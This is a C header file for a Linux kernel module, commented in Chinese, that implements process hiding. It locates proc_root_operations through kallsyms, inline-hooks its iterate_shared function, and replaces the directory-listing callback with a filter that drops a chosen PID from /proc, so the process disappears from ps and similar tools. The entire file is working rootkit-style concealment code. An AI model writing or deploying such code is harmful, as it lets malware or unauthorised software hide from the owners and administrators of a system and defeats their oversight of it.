
#ifndef HIDE_PROCESS_H
#define HIDE_PROCESS_H

#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/proc_fs.h>
#include <linux/version.h>
#include <linux/mutex.h>

#include "export_fun.h"
#include "inline_hook_frame.h"

// 要隐藏的用户进程 PID，0 表示未设置
static pid_t g_hidden_pid = 0;
static filldir_t g_orig_actor = NULL;

// 过滤回调：跳过 g_hidden_pid 对应的目录项，其余转发给原始 actor
static int hide_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (g_hidden_pid && d_type == DT_DIR && namlen > 0 && namlen <= 7)
    {
        char pid_str[8];
        int pid_len = snprintf(pid_str, sizeof(pid_str), "%d", g_hidden_pid);
        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
            return true;
    }
    if (g_orig_actor)
        return g_orig_actor(ctx, name, namlen, offset, ino, d_type);
    return false;
}

// inline hook 工作函数：在原始 iterate_shared 执行前替换 ctx->actor
static void proc_iterate_hook_work(struct file *file, struct dir_context *ctx)
{
    if (!g_hidden_pid || !ctx)
        return;
    if (ctx->actor == hide_filldir)
        return;
    // 保存原始 actor，替换为我们的过滤函数
    WRITE_ONCE(g_orig_actor, ctx->actor);
    ctx->actor = (filldir_t)hide_filldir;
}

static DEFINE_MUTEX(g_hide_process_hook_lock);

static struct hook_entry g_proc_iterate_hook[] = {
    HOOK_ENTRY(NULL, proc_iterate_hook_work),
};

// 安装 procfs 隐藏 hook
static int hide_process_hook_install(void)
{
    struct file_operations *fops;
    unsigned long iterate_addr;
    int ret;

    mutex_lock(&g_hide_process_hook_lock);

    if (g_proc_iterate_hook[0].installed)
    {
        mutex_unlock(&g_hide_process_hook_lock);
        return 0;
    }

    fops = (struct file_operations *)
        generic_kallsyms_lookup_name("proc_root_operations");
    if (!fops)
    {
        pr_debug("hide_process: 找不到 proc_root_operations\n");
        ret = -ENOENT;
        goto out_unlock;
    }
    if (!fops->iterate_shared)
    {
        pr_debug("hide_process: proc_root_operations 没有 iterate_shared\n");
        ret = -ENOENT;
        goto out_unlock;
    }

    iterate_addr = (unsigned long)fops->iterate_shared;

    g_proc_iterate_hook[0].target_addr = iterate_addr;

    ret = inline_hook_install(g_proc_iterate_hook);
    if (ret)
    {
        pr_debug("hide_process: inline hook 安装失败 %d\n", ret);
        goto out_unlock;
    }

    pr_debug("hide_process: hook 安装成功, iterate_shared=%px\n",
             (void *)iterate_addr);

out_unlock:
    mutex_unlock(&g_hide_process_hook_lock);
    return ret;
}

// 卸载 hook，恢复原始函数指令
static void hide_process_hook_remove(void)
{
    bool was_installed;

    mutex_lock(&g_hide_process_hook_lock);
    was_installed = g_proc_iterate_hook[0].installed;
    if (was_installed)
        inline_hook_remove(g_proc_iterate_hook);
    WRITE_ONCE(g_orig_actor, NULL);
    WRITE_ONCE(g_hidden_pid, 0);
    mutex_unlock(&g_hide_process_hook_lock);

    if (was_installed)
        pr_debug("hide_process: hook 已卸载\n");
}

// 清除隐藏
static inline void hide_process_clear_pid(void)
{
    WRITE_ONCE(g_hidden_pid, 0);
    hide_process_hook_remove();
}

// 设置要隐藏的 PID
static inline int hide_process_set_pid(pid_t pid)
{
    int ret;

    if (pid <= 0)
    {
        hide_process_clear_pid();
        return 0;
    }

    ret = hide_process_hook_install();
    if (ret)
    {
        pr_debug("hide_process: hook 未安装，拒绝隐藏 PID %d, ret=%d\n", pid, ret);
        return ret;
    }

    WRITE_ONCE(g_hidden_pid, pid);
    pr_debug("hide_process: 隐藏 PID %d\n", pid);
    return 0;
}

#endif // HIDE_PROCESS_H
